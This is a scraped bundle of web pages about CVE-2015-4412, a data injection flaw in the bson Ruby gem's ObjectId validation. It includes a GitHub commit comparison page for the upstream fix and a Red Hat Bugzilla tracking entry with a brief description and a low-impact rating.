* [Contact Us](https://access.redhat.com/support/contact/)
* [Customer Portal FAQ](https://access.redhat.com/articles/33844)
* [Log-in Assistance](https://access.redhat.com/help/login_assistance)

### Site Info

* [Trust Red Hat](https://www.redhat.com/en/trust)
* [Browser Support Policy](https://www.redhat.com/en/about/browser-support)
* [Accessibility](https://www.redhat.com/en/about/digital-accessibility)
* [Awards and Recognition](https://access.redhat.com/recognition/)
* [Colophon](https://access.redhat.com/help/colophon/)

### Related Sites

* [redhat.com](https://www.redhat.com/)
* [developers.redhat.com](http://developers.redhat.com/)
* [connect.redhat.com](https://connect.redhat.com/)
* [cloud.redhat.com](https://cloud.redhat.com/)

### Red Hat legal and privacy links

* [About Red Hat](https://redhat.com/en/about/company)
* [Jobs](https://redhat.com/en/jobs)
* [Events](https://redhat.com/en/events)
* [Locations](https://redhat.com/en/about/office-locations)
* [Contact Red Hat](https://redhat.com/en/contact)
* [Red Hat Blog](https://redhat.com/en/blog)
* [Diversity, equity, and inclusion](https://redhat.com/en/about/our-culture/diversity-equity-inclusion)
* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from github.com_39f65911_20250124_185546.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongodb%2Fbson-ruby%2Fcompare%2F7446d7c6764dfda8dc4480ce16d5c023e74be5ca...28f34978a85b689a4480b4d343389bf4886522e7)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fmongodb%2Fbson-ruby%2Fcompare%2F7446d7c6764dfda8dc4480ce16d5c023e74be5ca...28f34978a85b689a4480b4d343389bf4886522e7)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fcompare%2Fshow&source=header-repo&source_repo=mongodb%2Fbson-ruby)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[mongodb](/mongodb)
/
**[bson-ruby](/mongodb/bson-ruby)**
Public

* [Notifications](/login?return_to=%2Fmongodb%2Fbson-ruby) You must be signed in to change notification settings
* [Fork
  106](/login?return_to=%2Fmongodb%2Fbson-ruby)
* [Star
   78](/login?return_to=%2Fmongodb%2Fbson-ruby)

* [Code](/mongodb/bson-ruby)
* [Pull requests
  0](/mongodb/bson-ruby/pulls)
* [Discussions](/mongodb/bson-ruby/discussions)
* [Actions](/mongodb/bson-ruby/actions)
* [Security](/mongodb/bson-ruby/security)
* [Insights](/mongodb/bson-ruby/pulse)

Additional navigation options

* [Code](/mongodb/bson-ruby)
* [Pull requests](/mongodb/bson-ruby/pulls)
* [Discussions](/mongodb/bson-ruby/discussions)
* [Actions](/mongodb/bson-ruby/actions)
* [Security](/mongodb/bson-ruby/security)
* [Insights](/mongodb/bson-ruby/pulse)

[Permalink](https://github.com/mongodb/bson-ruby/compare/mongodb%3A7446d7c...mongodb%3A28f3497)
# Comparing changes

 Choose two branches to see what’s changed or to start a new pull request.
If you need to, you can also  compare across forks
 or
[learn more about diff comparisons](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

# Open a pull request

 Create a new pull request by comparing changes across two branches. If you need to, you can also  compare across forks
.
[Learn more about diff comparisons here](https://docs.github.com/pull-requests/collaborating-with-pull-requests/proposing-changes-to-your-work-with-pull-requests/about-comparing-branches-in-pull-requests#three-dot-and-two-dot-git-diff-comparisons).

*base repository:*
mongodb/bson-ruby

Failed to load repositories. Confirm that selected base ref is valid, then try again.

 Loading

*base:*
7446d7c6764dfda8dc4480ce16d5c023e74be5ca

Choose a base ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/mongodb/bson-ruby/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...28f34978a85b689a4480b4d343389bf4886522e7)

Could not load tags

Nothing to show

[{{ refName }}
default](/mongodb/bson-ruby/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...28f34978a85b689a4480b4d343389bf4886522e7)

 Loading

...

*head repository:*
mongodb/bson-ruby

Failed to load repositories. Confirm that selected head ref is valid, then try again.

 Loading

*compare:*
28f34978a85b689a4480b4d343389bf4886522e7

Choose a head ref

Branches
Tags

Could not load branches

Nothing to show

 Loading

[{{ refName }}
default](/mongodb/bson-ruby/compare/7446d7c6764dfda8dc4480ce16d5c023e74be5ca...%7B%7B%20urlEncodedRefName%20%7D%7D)

Could not load tags

Nothing to show

[{{ refName }}
default](/mongodb/bson-ruby/compare/7446d7c6764dfda8dc4480ce16d5c023e74be5ca...%7B%7B%20urlEncodedRefName%20%7D%7D)

 Loading

* 4

  commits
* 3

  files changed
* 1

  contributor

### Commits on Jun 4, 2015

1. [Use \A \z for checking regex on legal](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)

   [![@durran](https://avatars.githubusercontent.com/u/9030?s=40&v=4)](/durran)

   [durran](/mongodb/bson-ruby/commits?author=durran "View all commits by durran")
   committed
   Jun 4, 2015

   [6](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999#comments)

   Configuration menu

   * [View commit details](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)
   * Copy full SHA for 976da32
   * [Browse repository at this point](/mongodb/bson-ruby/tree/976da329ff03ecdfca3030eb6efe3c85e6db9999)

   Copy the full SHA

    [976da32](/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999)View commit details

   Browse the repository at this point in the history
2. [Bump version](/mongodb/bson-ruby/commit/58ed0e038d3219d126b026a7681f21666632f07a)

   [![@durran](https://avatars.githubusercontent.com/u/9030?s=40&v=4)](/durran)

   [durran](/mongodb/bson-ruby/commits?author=durran "View all commits by durran")
   committed
   Jun 4, 2015

   Configuration menu

   * [View commit details](/mongodb/bson-ruby/commit/58ed0e038d3219d126b026a7681f21666632f07a)
   * Copy full SHA for 58ed0e0
   * [Browse repository at this point](/mongodb/bson-ruby/tree/58ed0e038d3219d126b026a7681f21666632f07a)

   Copy the full SHA

    [58ed0e0](/mongodb/bson-ruby/commit/58ed0e038d3219d126b026a7681f21666632f07a)View commit details

   Browse the repository at this point in the history
3. [Update changelog](/mongodb/bson-ruby/commit/a5090de410cac593f5a66202f1dd35b37cc89dcb)

   [![@durran](https://avatars.githubusercontent.com/u/9030?s=40&v=4)](/durran)

   [durran](/mongodb/bson-ruby/commits?author=durran "View all commits by durran")
   committed
   Jun 4, 2015

   Configuration menu

   * [View commit details](/mongodb/bson-ruby/commit/a5090de410cac593f5a66202f1dd35b37cc89dcb)
   * Copy full SHA for a5090de
   * [Browse repository at this point](/mongodb/bson-ruby/tree/a5090de410cac593f5a66202f1dd35b37cc89dcb)

   Copy the full SHA

    [a5090de](/mongodb/bson-ruby/commit/a5090de410cac593f5a66202f1dd35b37cc89dcb)View commit details

   Browse the repository at this point in the history
4. [Latest is 3.0.4](/mongodb/bson-ruby/commit/28f34978a85b689a4480b4d343389bf4886522e7)

   [![@durran](https://avatars.githubusercontent.com/u/9030?s=40&v=4)](/durran)

   [durran](/mongodb/bson-ruby/commits?author=durran "View all commits by durran")
   committed
   Jun 4, 2015

   Configuration menu

   * [View commit details](/mongodb/bson-ruby/commit/28f34978a85b689a4480b4d343389bf4886522e7)
   * Copy full SHA for 28f3497
   * [Browse repository at this point](/mongodb/bson-ruby/tree/28f34978a85b689a4480b4d343389bf4886522e7)

   Copy the full SHA

    [28f3497](/mongodb/bson-ruby/commit/28f34978a85b689a4480b4d343389bf4886522e7)View commit details

   Browse the repository at this point in the history

 Loading

### This comparison is taking too long to generate.

Unfortunately it looks like we can’t render this comparison for you right now. It might be too big, or there might be something weird with your repository.

You can try running this command locally to see the comparison on your machine:

`git diff 7446d7c6764dfda8dc4480ce16d5c023e74be5ca...28f34978a85b689a4480b4d343389bf4886522e7`

  Retry

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from bugzilla.redhat.com_2819aad4_20250124_185544.html ===


* Login
  + Log in using an SSO provider:- [Fedora Account System](saml2_login.cgi?idp=Fedora%20Account%20System&target=show_bug.cgi%3Fid%3D1229750)
    - [Red Hat Associate](saml2_login.cgi?idp=Red%20Hat%20Associate&target=show_bug.cgi%3Fid%3D1229750)
    - [Red Hat Customer](saml2_login.cgi?idp=Red%20Hat%20Customer&target=show_bug.cgi%3Fid%3D1229750)+ Login using a Red Hat Bugzilla account
  + Forgot Password
  + [Create an Account](createaccount.cgi)

Red Hat Bugzilla – Bug 1229750

* [Home](./)
* [New](enter_bug.cgi)
* Search
  + [Simple Search](query.cgi?format=specific)
  + [Advanced Search](query.cgi?format=advanced)
* My Links
  + [Browse](describecomponents.cgi)
  + [Requests](request.cgi)
  + Reports
  + Current State
    - [Search](query.cgi)
    - [Tabular reports](query.cgi?format=report-table)
    - [Graphical reports](query.cgi?format=report-graph)
    - [Duplicates](duplicates.cgi)
  + Other Reports
    - [User Changes](https://bugzilla.redhat.com/page.cgi?id=user_activity.html)
  + Plotly Reports
    - [Bug Status](https://bugzilla.redhat.com/page.cgi?id=bug_status.html)
    - [Bug Severity](https://bugzilla.redhat.com/page.cgi?id=bug_severity.html)
    - [Non-Defaults](https://bugzilla.redhat.com/page.cgi?id=non_defaults.html)
* [Product Dashboard](page.cgi?id=productdashboard.html)

- Help
  * [Page Help!](docs/en/html/using/understanding.html)
  * [Bug Writing Guidelines](page.cgi?id=bug-writing.html)
  * [What's new](page.cgi?id=whats-new.html)
  * [Browser Support Policy](https://access.redhat.com/help/browsers)
  * [5.0.4.rh103 Release notes](page.cgi?id=release-notes.html)
  * [FAQ](page.cgi?id=faq.html)
  * [Guides index](docs/en/html/index.html)
  * [User guide](docs/en/html/using/index.html)
  * [Web Services](docs/en/html/integrating/api/Bugzilla/WebService/Bug.html)
  * [Contact](page.cgi?id=redhat/contact.html)
  * [Legal](page.cgi?id=terms-conditions.html)
- [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")

This site requires JavaScript to be enabled to function correctly, please enable it.

[**Bug 1229750**](show_bug.cgi?id=1229750)
(CVE-2015-4412)
- [CVE-2015-4412](https://access.redhat.com/security/cve/CVE-2015-4412) rubygem-bson: data injection vulnerability through a crafted ObjectId

[Summary:](page.cgi?id=fields.html#short_desc "The bug summary is a short sentence which succinctly describes what the bug is about.")
CVE-2015-4412 rubygem-bson: data injection vulnerability through a crafted Ob...

| | [Keywords](describekeywords.cgi): | Reopened  Security | | --- | --- | | [Status](page.cgi?id=fields.html#bug_status): | ASSIGNED | | [Alias:](page.cgi?id=fields.html#alias "A short, unique name assigned to a bug in order to assist with looking it up and referring to it in other places in Bugzilla.") | CVE-2015-4412 | | [Product:](describecomponents.cgi "Bugs are categorised into Products and Components. Select a Classification to narrow down this list.") | Security Response | | [Classification:](page.cgi?id=fields.html#classification "Bugs are categorised into Classifications, Products and Components. classifications is the top-level categorisation.") | Other | | [Component:](describecomponents.cgi?product=Security Response "Components are second-level categories; each belongs to a particular Product. Select a Product to narrow down this list.") | vulnerability | | [Sub Component:](page.cgi?id=fields.html#rh_sub_components "The sub component of a specific component") | --- | | [Version:](page.cgi?id=fields.html#version "The version field defines the version of the software the bug was found in.") | unspecified | | [Hardware:](page.cgi?id=fields.html#rep_platform "The hardware platform the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | All | | [OS:](page.cgi?id=fields.html#op_sys "The operating system the bug was observed on. Note: When searching, selecting the option \"All\" only finds bugs whose value for this field is literally the word \"All\".") | Linux | | [Priority:](page.cgi?id=fields.html#priority) | low | | [Severity:](page.cgi?id=fields.html#bug_severity) | low | | [Target Milestone:](page.cgi?id=fields.html#target_milestone "The Target Milestone field is used to define when the engineer the bug is assigned to expects to fix it.") | --- | | [Assignee:](page.cgi?id=fields.html#assigned_to "The person in charge of resolving the bug.") | Nobody | | [QA Contact:](page.cgi?id=fields.html#qa_contact "The person responsible for confirming this bug if it is unconfirmed, and for verifying the fix once the bug has been resolved.") |  | | [Docs Contact:](page.cgi?id=fields.html#docs_contact "The person responsible for documenting once the bug has been resolved.") |  | | [URL:](page.cgi?id=fields.html#bug_file_loc "Bugs can have a URL associated with them - for example, a pointer to a web site where the problem is seen.") |  | | [Whiteboard:](page.cgi?id=fields.html#status_whiteboard "Each bug has a free-form single line text entry box for adding tags and status information.") |  | | [Depends On:](page.cgi?id=fields.html#dependson "The bugs listed here must be resolved before this bug can be resolved.") | [1229751](show_bug.cgi?id=1229751 "CLOSED CURRENTRELEASE - CVE-2015-4412 rubygem-bson: data injection vulnerability through a crafted ObjectId [fedora-all]") [1229752](show_bug.cgi?id=1229752) [1229753](show_bug.cgi?id=1229753) | | [Blocks:](page.cgi?id=fields.html#blocked "This bug must be resolved before the bugs listed in this field can be resolved.") | [1228705](show_bug.cgi?id=1228705) | | TreeView+ | [depends on](buglist.cgi?bug_id=1229750&bug_id_type=anddependson&format=tvp) / [blocked](buglist.cgi?bug_id=1229750&bug_id_type=andblocked&format=tvp&tvp_dir=blocked) |  | |  | | [Reported:](page.cgi?id=fields.html#reporter) | 2015-06-09 14:44 UTC by Vasyl Kaigorodov | | --- | --- | | [Modified:](page.cgi?id=fields.html#modified) | 2024-06-04 10:50 UTC ([History](show_activity.cgi?id=1229750)) | | [CC List:](page.cgi?id=fields.html#cclist) | 12 users (show)  bkearney bleanhar cbillett dmcphers jialiu jorton jshepherd katello-bugs lmeyer tdawson vondruch whearn | | Fixed In Version: |  | | | Doc Type: | Bug Fix | | | Doc Text: |  | | | Clone Of: |  | | | Environment: |  | | | Last Closed: | 2015-07-29 22:21:58 UTC | | | Embargoed: |  | | |
| --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- | --- |
| --- | | |

| | Attachments | [(Terms of Use)](page.cgi?id=terms-conditions.html) | | | --- | --- | --- | |  | | | |  |
| --- | --- | --- | --- | --- | --- | --- | --- |

| [Description](show_bug.cgi?id=1229750#c0)  Vasyl Kaigorodov    2015-06-09 14:44:10 UTC  ``` The following data injection issue was discovered in BSON Ruby gem:  It's possible to bypass Moped::BSON::ObjecId.legal? method, and pass any binary data in a crafted ObjectId string. More details can be found here: <http://sakurity.com/blog/2015/06/04/mongo_ruby_regexp.html> Upstream fix: <https://github.com/mongodb/bson-ruby/commit/976da329ff03ecdfca3030eb6efe3c85e6db9999>   ```  [Comment 1](show_bug.cgi?id=1229750#c1)  Vasyl Kaigorodov    2015-06-09 14:44:52 UTC  ```  Created rubygem-bson tracking bugs for this issue:  Affects: fedora-all [[bug 1229751](show_bug.cgi?id=1229751 "CLOSED CURRENTRELEASE - CVE-2015-4412 rubygem-bson: data injection vulnerability through a crafted ObjectId [fedora-all]")]   ```  [Comment 7](show_bug.cgi?id=1229750#c7)  Kurt Seifried    2015-07-29 22:21:58 UTC  ``` Statement:  This issue affects the versions of rubygem-bson as shipped with Red Hat OpenShift Enterprise 2.x. Red Hat Product Security has rated this issue as having Low security impact on Red Hat OpenShift Enterprise 2. Additionally access to the component using rubygem-moped is restricted, only trusted users and systems can send messages, thus no trust boundary violation occurs and this issue can not easily be used to create an exploitable security vulnerability on Red Hat OpenShift Enterprise 2.   ``` |  |
| --- | --- |

---

| Note You need to [log in](show_bug.cgi?id=1229750&GoAheadAndLogIn=1) before you can comment on or make changes to this bug. |
| --- |

---

[Privacy](page.cgi?id=redhat/privacy.html)
[Contact](page.cgi?id=redhat/contact.html)
[FAQ](page.cgi?id=faq.html)
[Legal](page.cgi?id=terms-conditions.html)


